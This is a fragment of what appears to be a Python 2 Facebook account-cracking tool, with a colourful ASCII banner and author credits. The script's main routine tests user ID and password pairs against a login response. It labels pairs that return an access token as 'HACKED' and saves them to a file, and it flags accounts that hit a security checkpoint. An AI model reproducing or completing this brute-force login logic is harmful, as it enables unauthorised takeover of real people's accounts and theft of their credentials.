...
\033[0;94m  _____  _    _   _ __  __ ___ ____  
\033[0;94m |_   _|/ \  | | | |  \/  |_ _|  _ \ 
\033[0;96m   | | / _ \ | |_| | |\/| || || | | |
\033[0;96m   | |/ ___ \|  _  | |  | || || |_| |
\033[0;96m   |_/_/   \_\_| |_|_|  |_|___|____/ 

""")

print("\033[0;91mThis Tool's Free By Mr Tahu")
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : TAHMID'
    print '\033[0;94mFACEBOOK : MR TA 111'
    print '\033[0;96mGITHUB   : MRTAHSIN'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[TAHUX-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[TAHUX-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
